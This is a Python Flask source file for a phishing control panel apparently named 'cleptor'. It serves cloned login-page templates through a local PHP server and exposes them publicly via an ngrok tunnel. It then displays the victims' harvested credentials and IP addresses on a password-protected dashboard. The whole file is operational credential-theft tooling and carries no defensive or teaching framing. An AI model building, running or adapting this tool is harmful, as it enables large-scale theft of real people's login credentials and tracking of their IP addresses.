from flask import Flask, render_template, request, redirect, session
import os
import time
import requests
import subprocess
from pathlib import Path

app = Flask(__name__)
app.secret_key = "cleptor_secret_key"

ngrok_process = None
php_process = None
NGROK_RETRIES = 5
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
LINK_FILE = os.path.join(BASE_DIR, "link.txt")

def start_services():
    global ngrok_process, php_process
    stop_services()
    php_process = subprocess.Popen(["php", "-S", "localhost:3333", "-t", BASE_DIR],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(10):
        try:
            if requests.get("http://localhost:3333").status_code == 200:
                break
        except:
            time.sleep(1)
    ngrok_process = subprocess.Popen(["./ngrok", "http", "3333"],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(NGROK_RETRIES):
        time.sleep(4)
        try:
            tunnels = requests.get("http://localhost:4040/api/tunnels").json()['tunnels']
            url = tunnels[0]['public_url']
            with open(LINK_FILE, "w") as f:
                f.write(url)
            return
        except:
            continue
    with open(LINK_FILE, "w") as f:
        f.write("Ngrok start failed")

def stop_services():
    global ngrok_process, php_process
    if php_process: php_process.terminate()
    if ngrok_process: ngrok_process.terminate()
    php_process = ngrok_process = None

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("username") == "cleptor" and request.form.get("password") == "cleptor":
            session["admin"] = True
            start_services()
            return redirect("/")
        return "<h3>Wrong credentials</h3>"
    return render_template("login.html")

@app.before_request
def require_login():
    if request.endpoint not in ("login", "static") and not session.get("admin"):
        return redirect("/login")

@app.route("/logout")
def logout():
    session.clear()
    stop_services()
    return redirect("/login")

@app.route("/", methods=["GET", "POST"])
def index():
    websites = get_phishing_templates()
    selected_site = request.form["site"] if request.method == "POST" else websites[0] if websites else None
    link = get_link()
    full_link = f"{link}/websites/{selected_site}/index.html" if link and selected_site else "No link"
    status = {
        "php": check_php_status(),
        "ngrok": check_ngrok_status(),
        "base_link": link,
        "selected_link": full_link
    }
    creds = read_file(f"logs/{selected_site}_creds.txt") if selected_site else ""
    ips = read_file(f"logs/{selected_site}_ip.txt") if selected_site else ""
    return render_template("index.html", websites=websites, selected=selected_site, status=status, creds=creds, ips=ips)

def get_phishing_templates():
    path = os.path.join(BASE_DIR, "websites")
    return [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]

def get_link():
    if os.path.exists(LINK_FILE):
        with open(LINK_FILE) as f:
            return f.read().strip()
    return None

def read_file(path):
    try:
        with open(path) as f:
            return f.read()
    except:
        return "[No data]"

def check_php_status():
    try:
        r = requests.get("http://localhost:3333", timeout=1)
        return r.status_code == 200
    except:
        return False

def check_ngrok_status():
    try:
        r = requests.get("http://localhost:4040/api/tunnels", timeout=1)
        return 'tunnels' in r.json()
    except:
        return False

if __name__ == "__main__":
    os.makedirs("logs", exist_ok=True)
    for site in get_phishing_templates():
        Path(f"logs/{site}_creds.txt").touch()
        Path(f"logs/{site}_ip.txt").touch()
    app.run(debug=True, port=5000)